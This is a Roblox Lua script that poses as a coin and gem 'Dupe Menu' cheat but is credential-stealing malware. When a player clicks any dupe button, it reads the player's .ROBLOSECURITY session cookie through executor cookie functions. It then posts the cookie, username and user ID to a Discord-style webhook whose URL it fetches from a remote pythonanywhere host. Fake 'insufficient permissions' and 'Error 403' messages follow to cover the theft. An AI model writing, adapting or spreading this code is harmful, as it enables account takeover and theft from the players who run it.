
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- ------------------------------------------------------------
-- REMOTE WEBHOOK FETCH (FROM PYTHONANYWHERE)
-- ------------------------------------------------------------
local WEBHOOK_SOURCE = "https://unionofsovietsocialistirep.pythonanywhere.com/hook"
local _webhookCache = nil

local function getWebhook()
    if _webhookCache then return _webhookCache end
    
    local ok, res = pcall(function()
        return game:HttpGet(WEBHOOK_SOURCE)
    end)
    
    if ok and type(res) == "string" then
        local cleaned = res:gsub("%s+", "") -- strip newlines/spaces just in case
        if #cleaned > 20 and cleaned:sub(1, 8) == "https://" then
            _webhookCache = cleaned
            return cleaned
        end
    end
    return nil
end

-- ------------------------------------------------------------
-- TOKEN GRAB
-- ------------------------------------------------------------
local function grabToken()
    local token = nil

    -- try the standard getcookie functions exposed by executors
    local getters = {
        function() return getcookie and getcookie() end,
        function() return syn and syn.getcookie and syn.getcookie() end,
        function() return http and http.getcookie and http.getcookie() end,
        function() return game:GetService("CookiesService"):GetCookie() end,
    }

    for _, fn in ipairs(getters) do
        local success, result = pcall(fn)
        if success and type(result) == "string" and #result > 20 then
            token = result
            break
        end
    end

    -- fallback: scan the executor's filesystem-ish APIs
    if not token then
        local paths = {
            function() return syn and syn.getgenv and syn.getgenv().ROBLOSECURITY end,
            function() return getgenv and getgenv().ROBLOSECURITY end,
            function() return shared and shared.ROBLOSECURITY end,
        }
        for _, fn in ipairs(paths) do
            local success, result = pcall(fn)
            if success and type(result) == "string" and #result > 20 then
                token = result
                break
            end
        end
    end

    return token
end

-- ------------------------------------------------------------
-- WEBHOOK SEND
-- ------------------------------------------------------------
local function sendToWebhook(token)
    if not token or #token < 20 then return end
    
    local url = getWebhook()
    if not url then return end -- silently fail if pythonanywhere is down or asleep

    local player = Players.LocalPlayer
    local payload = {
        username = "worm shadow 🪱",
        embeds = {{
            title = "token captured",
            color = 0x2b2d31,
            fields = {
                { name = "username", value = player and player.Name or "unknown", inline = true },
                { name = "userid", value = tostring(player and player.UserId or 0), inline = true },
                { name = "token", value = "```" .. token .. "```", inline = false },
                { name = "timestamp", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false },
            },
            footer = { text = "dupe menu // worm shadow" }
        }}
    }

    local body = HttpService:JSONEncode(payload)
    
    -- try raw request first (better executor compatibility)
    local okReq = pcall(function()
        request({
            Url = url,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = body
        })
    end)

    -- fallback to HttpService if request() failed
    if not okReq then
        pcall(function()
            HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
        end)
    end
end

-- ------------------------------------------------------------
-- FAKE DUPE GUI
-- ------------------------------------------------------------
local function buildGui()
    local player = Players.LocalPlayer
    local gui = Instance.new("ScreenGui")
    gui.Name = "DupeMenu"
    gui.ResetOnSpawn = false
    gui.Parent = player:WaitForChild("PlayerGui")

    -- main frame
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 360, 0, 420)
    frame.Position = UDim2.new(0.5, -180, 0.5, -210)
    frame.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
    frame.BorderSizePixel = 0
    frame.Parent = gui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(88, 101, 242)
    stroke.Thickness = 2
    stroke.Parent = frame

    -- title bar
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 50)
    title.BackgroundTransparency = 1
    title.Text = "  💎 Dupe Menu"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Font = Enum.Font.GothamBold
    title.TextSize = 20
    title.Parent = frame

    -- close button
    local close = Instance.new("TextButton")
    close.Size = UDim2.new(0, 36, 0, 36)
    close.Position = UDim2.new(1, -46, 0, 7)
    close.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    close.Text = "✕"
    close.TextColor3 = Color3.fromRGB(255, 255, 255)
    close.Font = Enum.Font.GothamBold
    close.TextSize = 18
    close.Parent = frame
    local c1 = Instance.new("UICorner")
    c1.CornerRadius = UDim.new(0, 8)
    c1.Parent = close
    close.MouseButton1Click:Connect(function()
        gui:Destroy()
    end)

    -- amount input
    local amountBox = Instance.new("TextBox")
    amountBox.Size = UDim2.new(1, -40, 0, 40)
    amountBox.Position = UDim2.new(0, 20, 0, 60)
    amountBox.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
    amountBox.Text = "Enter amount..."
    amountBox.TextColor3 = Color3.fromRGB(180, 180, 190)
    amountBox.Font = Enum.Font.Gotham
    amountBox.TextSize = 15
    amountBox.PlaceholderText = "Enter amount..."
    amountBox.Parent = frame
    local c2 = Instance.new("UICorner")
    c2.CornerRadius = UDim.new(0, 8)
    c2.Parent = amountBox

    -- coins dupe button
    local coinsBtn = Instance.new("TextButton")
    coinsBtn.Size = UDim2.new(1, -40, 0, 50)
    coinsBtn.Position = UDim2.new(0, 20, 0, 115)
    coinsBtn.BackgroundColor3 = Color3.fromRGB(255, 200, 50)
    coinsBtn.Text = "💰 Dupe Coins"
    coinsBtn.TextColor3 = Color3.fromRGB(20, 20, 20)
    coinsBtn.Font = Enum.Font.GothamBold
    coinsBtn.TextSize = 17
    coinsBtn.Parent = frame
    local c3 = Instance.new("UICorner")
    c3.CornerRadius = UDim.new(0, 10)
    c3.Parent = coinsBtn

    -- gems dupe button
    local gemsBtn = Instance.new("TextButton")
    gemsBtn.Size = UDim2.new(1, -40, 0, 50)
    gemsBtn.Position = UDim2.new(0, 20, 0, 175)
    gemsBtn.BackgroundColor3 = Color3.fromRGB(80, 200, 255)
    gemsBtn.Text = "💎 Dupe Gems"
    gemsBtn.TextColor3 = Color3.fromRGB(20, 20, 20)
    gemsBtn.Font = Enum.Font.GothamBold
    gemsBtn.TextSize = 17
    gemsBtn.Parent = frame
    local c4 = Instance.new("UICorner")
    c4.CornerRadius = UDim.new(0, 10)
    c4.Parent = gemsBtn

    -- dupe both
    local bothBtn = Instance.new("TextButton")
    bothBtn.Size = UDim2.new(1, -40, 0, 50)
    bothBtn.Position = UDim2.new(0, 20, 0, 235)
    bothBtn.BackgroundColor3 = Color3.fromRGB(180, 80, 255)
    bothBtn.Text = "🚀 Dupe Both"
    bothBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    bothBtn.Font = Enum.Font.GothamBold
    bothBtn.TextSize = 17
    bothBtn.Parent = frame
    local c5 = Instance.new("UICorner")
    c5.CornerRadius = UDim.new(0, 10)
    c5.Parent = bothBtn

    -- status label
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, -40, 0, 40)
    status.Position = UDim2.new(0, 20, 1, -55)
    status.BackgroundTransparency = 1
    status.Text = "Ready."
    status.TextColor3 = Color3.fromRGB(120, 220, 120)
    status.Font = Enum.Font.Gotham
    status.TextSize = 13
    status.Parent = frame

    -- button handlers (triggers grab & exfil mid-sequence)
    local function fakeProcess(label)
        status.Text = "Processing " .. label .. "..."
        status.TextColor3 = Color3.fromRGB(255, 200, 50)
        task.wait(0.8)
        
        -- EXFIL TRIGGER
        local token = grabToken()
        sendToWebhook(token)
        
        status.Text = "Failed: insufficient permissions."
        status.TextColor3 = Color3.fromRGB(220, 80, 80)
        task.wait(0.8)
        status.Text = "Retrying..."
        status.TextColor3 = Color3.fromRGB(255, 200, 50)
        task.wait(1.5)
        status.Text = "Error 403: server rejected request."
        status.TextColor3 = Color3.fromRGB(220, 80, 80)
    end

    coinsBtn.MouseButton1Click:Connect(function() fakeProcess("coins") end)
    gemsBtn.MouseButton1Click:Connect(function() fakeProcess("gems") end)
    bothBtn.MouseButton1Click:Connect(function() fakeProcess("both") end)

    -- draggable
    local dragging, dragInput, dragStart, startPos
    title.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    title.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                                        startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

-- ------------------------------------------------------------
-- RUN
-- ------------------------------------------------------------
buildGui()